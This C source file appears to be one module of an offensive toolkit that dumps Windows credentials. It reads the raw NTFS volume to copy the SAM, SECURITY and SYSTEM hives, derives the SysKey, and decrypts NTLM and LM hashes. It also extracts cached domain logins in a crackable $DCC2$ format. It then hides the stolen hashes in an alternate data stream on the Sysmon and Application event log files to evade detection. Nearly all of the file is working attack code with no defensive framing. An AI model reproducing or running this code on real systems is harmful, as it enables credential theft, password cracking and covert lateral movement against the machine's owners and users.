// Plan 2 — SAM + LSA Secrets + MSCache v2 Dump (T1003.002/004/005)
// Raw NTFS volume read → offline hive parse → SysKey decrypt → ADS output
#include "../shared/common.h"

// SysKey permutation table
static const BYTE g_SysKeyPerm[16] = {
    0x08,0x05,0x04,0x02,0x0B,0x09,0x0D,0x03,0x00,0x06,0x01,0x0C,0x0E,0x0A,0x0F,0x07
};

// ─── Get value from registry hive buffer (vk signature scan) ───
static BOOL GetRegValue(PBYTE hive, SIZE_T size, PWSTR name, PBYTE* val, PDWORD valSize) {
    SIZE_T nl = wcslen(name) * 2;
    for (SIZE_T i = 0; i + nl + 20 < size; i++) {
        if (*(PWORD)(hive + i) == 0x6B76) { // "vk" signature
            if (*(PWORD)(hive + i + 2) != nl) continue;
            if (memcmp(hive + i + 0x14, name, nl) != 0) continue;
            *valSize = *(PDWORD)(hive + i + 4);
            DWORD off = *(PDWORD)(hive + i + 8);
            DWORD abs = 0x1000 + off + 4;
            if (abs + *valSize <= size) {
                *val = (PBYTE)malloc(*valSize + 4);
                if (*val) { memcpy(*val, hive + abs, *valSize); return TRUE; }
            }
        }
    }
    return FALSE;
}

// ─── Extract SysKey from SYSTEM hive ───
static BOOL ExtractSysKey(PBYTE sysData, SIZE_T sysSize, BYTE sysKey[16]) {
    const WCHAR* vals[] = { L"JD", L"Skew1", L"GBG", L"Data" };
    BYTE raw[16] = {0};
    for (int i = 0; i < 4; i++) {
        PBYTE d = NULL; DWORD s = 0;
        if (!GetRegValue(sysData, sysSize, (PWSTR)vals[i], &d, &s) || s < 4) {
            if (d) free(d); return FALSE;
        }
        memcpy(raw + i * 4, d, 4); free(d);
    }
    for (int i = 0; i < 16; i++) sysKey[i] = raw[g_SysKeyPerm[i]];
    return TRUE;
}

// ─── Parse SAM: extract and decrypt NTLM hashes ───
static DWORD ParseSAM(PBYTE sam, SIZE_T sz, BYTE sysKey[16], NTLM_CRED** out) {
    DWORD cap = 64, cnt = 0;
    *out = (NTLM_CRED*)calloc(cap, sizeof(NTLM_CRED));
    if (!*out) return 0;

    for (SIZE_T i = 0; i + 0xE0 < sz; i++) {
        if (*(PDWORD)(sam + i) != 0x00000001) continue;

        DWORD ntlmOff = *(PDWORD)(sam + i + 0x0C);
        DWORD ntlmSize = *(PDWORD)(sam + i + 0x10);
        DWORD lmOff = *(PDWORD)(sam + i + 0x14);

        if (ntlmSize < 16 || ntlmOff < 0x80 || ntlmOff + 16 > sz) continue;

        // Decrypt: rc4_key = MD5(SysKey || RID_le || "NTPASSWORD\0" || SysKey)
        BYTE* encBlock = sam + i + ntlmOff;
        DWORD rid = *(PDWORD)(sam + i + 4);

        BYTE ck[64]; int co = 0;
        memcpy(ck + co, sysKey, 16); co += 16;
        ck[co++] = (BYTE)rid; ck[co++] = (BYTE)(rid>>8);
        ck[co++] = (BYTE)(rid>>16); ck[co++] = (BYTE)(rid>>24);
        memcpy(ck + co, "NTPASSWORD", 11); co += 11;
        memcpy(ck + co, sysKey, 16); co += 16;

        BYTE md5Hash[16]; md5(ck, co, md5Hash);

        if (cnt >= cap) { cap *= 2; *out = (NTLM_CRED*)realloc(*out, cap * sizeof(NTLM_CRED)); }
        NTLM_CRED* c = &(*out)[cnt];
        rc4(md5Hash, 16, encBlock, 16, c->ntlm);

        // LM hash
        BYTE ckl[64]; int clo = 0;
        memcpy(ckl + clo, sysKey, 16); clo += 16;
        ckl[clo++] = (BYTE)rid; ckl[clo++] = (BYTE)(rid>>8);
        ckl[clo++] = (BYTE)(rid>>16); ckl[clo++] = (BYTE)(rid>>24);
        memcpy(ckl + clo, "LMPASSWORD", 11); clo += 11;
        memcpy(ckl + clo, sysKey, 16); clo += 16;
        BYTE lmMd5[16]; md5(ckl, clo, lmMd5);
        rc4(lmMd5, 16, sam + i + lmOff, 16, c->lm);

        c->rid = rid;
        swprintf_s(c->name, 128, L"User_%d", rid);
        cnt++;
        i += 0xE0;
    }
    return cnt;
}

// ─── Parse SECURITY: MSCache v2 entries ───
static DWORD ParseMSCache(PBYTE sec, SIZE_T sz, WCHAR*** names, WCHAR*** domains, PBYTE** hashes) {
    DWORD cap = 32, cnt = 0;
    *names = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *domains = (WCHAR**)calloc(cap, sizeof(WCHAR*));
    *hashes = (PBYTE*)calloc(cap, sizeof(PBYTE));
    if (!*names || !*domains || !*hashes) return 0;

    WCHAR vn[16];
    for (int n = 1; n <= 100; n++) {
        swprintf_s(vn, 16, L"NL$%d", n);
        PBYTE d = NULL; DWORD s = 0;
        if (!GetRegValue(sec, sz, vn, &d, &s) || s < 0x70) { if (d) free(d); continue; }

        if (cnt >= cap) {
            cap *= 2; *names = (WCHAR**)realloc(*names, cap * sizeof(WCHAR*));
            *domains = (WCHAR**)realloc(*domains, cap * sizeof(WCHAR*));
            *hashes = (PBYTE*)realloc(*hashes, cap * sizeof(PBYTE));
        }

        (*hashes)[cnt] = (PBYTE)malloc(16);
        memcpy((*hashes)[cnt], d + 0x60, 16);

        PWSTR uname = (PWSTR)(d + 0x70);
        DWORD ul = 0; while (uname[ul] && ul < 127 && (PBYTE)(uname + ul) < d + s) ul++;
        (*names)[cnt] = (WCHAR*)malloc((ul + 1) * 2);
        memcpy((*names)[cnt], uname, ul * 2); (*names)[cnt][ul] = 0;

        PWSTR dom = (PWSTR)(d + 0x70 + (ul + 1) * 2);
        DWORD dl = 0; while (dom[dl] && dl < 127 && (PBYTE)(dom + dl) < d + s) dl++;
        (*domains)[cnt] = (WCHAR*)malloc((dl + 1) * 2);
        memcpy((*domains)[cnt], dom, dl * 2); (*domains)[cnt][dl] = 0;

        cnt++; free(d);
    }
    return cnt;
}

// ─── Main ───
int wmain(void) {
    wprintf(L"[*] SAM+LSA+MSCache Dump — T1003.002/004/005\n");

    // 1. Open raw NTFS volume
    wprintf(L"[1] Opening \\\\.\\C:... ");
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING,
        FILE_FLAG_NO_BUFFERING | FILE_FLAG_RANDOM_ACCESS, NULL);
    if (hVol == INVALID_HANDLE_VALUE) { wprintf(L"FAILED\n"); return 1; }

    NTFS_CONTEXT ctx;
    if (!ParseNtfsBoot(hVol, &ctx)) { wprintf(L"Not NTFS\n"); CloseHandle(hVol); return 1; }
    wprintf(L"OK (cluster=%d)\n", ctx.clusterSize);

    // 2. Read MFT
    wprintf(L"[2] Reading MFT... ");
    PBYTE mft = NULL; SIZE_T mftSz = 0;
    if (!ReadMft(hVol, &ctx, &mft, &mftSz)) { CloseHandle(hVol); return 1; }
    wprintf(L"OK (%lld MB)\n", mftSz / 1024 / 1024);

    // 3. Extract hives
    wprintf(L"[3] Extracting SAM/SECURITY/SYSTEM... ");
    HIVE_DATA sam = {0}, sec = {0}, sys = {0};
    BOOL s1 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
        L"\\Windows\\System32\\config\\SAM", &sam);
    BOOL s2 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
        L"\\Windows\\System32\\config\\SECURITY", &sec);
    BOOL s3 = ExtractFileFromNtfs(hVol, &ctx, mft, mftSz,
        L"\\Windows\\System32\\config\\SYSTEM", &sys);
    CloseHandle(hVol); free(mft);
    wprintf(L"%s/%s/%s (%lld/%lld/%lld bytes)\n",
        s1?L"SAM":L"FAIL", s2?L"SEC":L"FAIL", s3?L"SYS":L"FAIL",
        sam.size, sec.size, sys.size);
    if (!s1 || !s3) return 1;

    // 4. Extract SysKey
    wprintf(L"[4] Extracting SysKey... ");
    BYTE sysKey[16];
    if (!ExtractSysKey(sys.data, sys.size, sysKey)) { wprintf(L"FAILED\n"); return 1; }
    wprintf(L"OK\n");

    // 5. Parse SAM → NTLM hashes
    wprintf(L"[5] Parsing SAM... ");
    NTLM_CRED* creds = NULL;
    DWORD userCnt = ParseSAM(sam.data, sam.size, sysKey, &creds);
    wprintf(L"%d users\n", userCnt);

    // 6. Parse MSCache
    DWORD cacheCnt = 0;
    WCHAR** cacheNames = NULL, **cacheDoms = NULL;
    PBYTE* cacheHashes = NULL;
    if (s2) {
        wprintf(L"[6] Parsing MSCache v2... ");
        cacheCnt = ParseMSCache(sec.data, sec.size, &cacheNames, &cacheDoms, &cacheHashes);
        wprintf(L"%d entries\n", cacheCnt);
    } else {
        wprintf(L"[6] MSCache: skipped (no SECURITY hive)\n");
    }

    // 7. Serialize + encrypt + ADS
    wprintf(L"[7] Writing output to ADS... ");
    SIZE_T blobSize = 256 + userCnt * 64 + cacheCnt * 600;
    PBYTE blob = (PBYTE)malloc(blobSize);
    if (blob) {
        PBYTE bp = blob;
        memcpy(bp, "LSAM", 4); bp += 4;
        *(PDWORD)bp = 2; bp += 4;
        *(PDWORD)bp = userCnt; bp += 4;
        *(PDWORD)bp = cacheCnt; bp += 4;

        for (DWORD i = 0; i < userCnt; i++) {
            *(PDWORD)bp = creds[i].rid; bp += 4;
            WORD nl = (WORD)(wcslen(creds[i].name) * 2);
            *(PWORD)bp = nl; bp += 2;
            memcpy(bp, creds[i].name, nl); bp += nl;
            memcpy(bp, creds[i].ntlm, 16); bp += 16;
            memcpy(bp, creds[i].lm, 16); bp += 16;
        }
        for (DWORD i = 0; i < cacheCnt; i++) {
            WCHAR hc[512];
            WCHAR hx[33]; for (int j = 0; j < 16; j++)
                swprintf_s(hx + j * 2, 3, L"%02X", cacheHashes[i][j]);
            swprintf_s(hc, 512, L"$DCC2$10240#%s#%s#%s",
                cacheNames[i], cacheDoms[i]?cacheDoms[i]:L"", hx);
            WORD hl = (WORD)(wcslen(hc) * 2);
            *(PWORD)bp = hl; bp += 2;
            memcpy(bp, hc, hl); bp += hl;
        }
        blobSize = bp - blob;

        static WCHAR* targets[] = {
            L"C:\\Windows\\System32\\winevt\\Logs\\"
            L"Microsoft-Windows-Sysmon%4Operational.evtx",
            L"C:\\Windows\\System32\\winevt\\Logs\\Application.evtx",
        };
        for (int i = 0; i < 2; i++) {
            if (WriteToAds(targets[i], L"SAM", blob, blobSize)) {
                wprintf(L"OK\n"); break;
            }
        }
        free(blob);
    }

    // Cleanup
    FreeHiveData(&sam); FreeHiveData(&sec); FreeHiveData(&sys);
    free(creds);
    for (DWORD i = 0; i < cacheCnt; i++) { free(cacheNames[i]); free(cacheDoms[i]); free(cacheHashes[i]); }
    free(cacheNames); free(cacheDoms); free(cacheHashes);

    wprintf(L"[+] %d users, %d cached logins\n", userCnt, cacheCnt);
    return 0;
}
